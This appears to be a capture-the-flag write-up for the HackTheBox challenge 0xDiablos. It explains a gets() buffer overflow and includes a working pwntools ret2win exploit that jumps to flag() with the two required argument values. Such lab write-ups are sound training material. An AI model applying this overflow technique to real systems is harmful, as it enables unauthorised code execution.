---
layout: post
title: "0xDiablos (HTB pwn)"
subtitle: "classic gets() stack overflow, return into flag() with the two magic args"
date: 2023-04-23
tags: [htb, ctf, pwn, buffer-overflow, ret2win]
category: writeups
kind: challenge
tldr: "A 32-bit no-PIE binary reads into a 180-byte buffer with gets(). I overflowed 188 bytes to the saved return address, pointed it at flag(), and stacked a fake return plus the two argument values flag() checks (0xdeadbeef, 0xc0ded00d) so it printed the flag."
---

## the challenge

0xDiablos is a starter pwn challenge. You get a 32-bit Linux ELF and a remote instance. `checksec` showed the easy mode: partial RELRO, no canary, NX disabled, no PIE (base `0x8048000`). The goal is to make the program print `flag.txt`, which it only does inside a function that never runs on a normal path.

## the bug

`main` sets up buffering and calls `vuln()`:

```c
void vuln(void) {
  char local_bc[180];
  gets(local_bc);
  puts(local_bc);
  return;
}
```

`gets()` has no bound, so anything I type past 180 bytes keeps writing up the stack. There is also a `flag()` function the program never calls:

```c
void flag(int param_1, int param_2) {
  char flag[64];
  FILE *fd;
  fd = fopen("flag.txt", "r");
  if (fd != (FILE *)0x0) {
    fgets(flag, 0x40, fd);
    if ((param_1 == -559038737) && (param_2 == -1059139571)) {
      printf(flag);
    }
    return;
  }
  ...
}
```

Those two constants are `0xdeadbeef` and `0xc0ded00d`. So this is ret2win with an argument check: overwrite the saved EIP with `flag()` and supply both values on the stack where the function reads its parameters.

## the solve

I found the offset with a cyclic pattern under gdb-peda. The EIP came back as `0x41417741`, and `pattern offset` placed it at `188`. `flag()` lives at `0x080491e2`.

On a 32-bit cdecl call, the stack at function entry is: saved return address, then arg1, then arg2. After I overwrite EIP with `flag()`, the next 4 bytes become `flag()`'s own return address (a throwaway), then come the two ints it compares.

```python
from pwn import *

buffer_size  = 188
padding      = b"AAAA"        # fake return address for flag()
flag_address = 0x080491e2
param_1      = 0xdeadbeef
param_2      = 0xc0ded00d

payload = (
    b"A" * buffer_size +
    p32(flag_address) +
    padding +
    p32(param_1) +
    p32(param_2)
)

io = remote("188.166.171.200", 30655)
io.sendline(payload)
io.interactive()
```

## the flag

After `vuln()` returns, EIP jumps into `flag()`. The argument check passes because both ints sit exactly where the function expects them, so `printf(flag)` ran and the flag came back over the connection. It reads like a note that your buffer is not healthy.

The Ghidra decompile shows the checks as the signed values `-559038737` and `-1059139571`, which are just the two's-complement reading of `0xdeadbeef` and `0xc0ded00d`. Sending the raw little-endian dwords with `p32()` lands the same bytes either way.
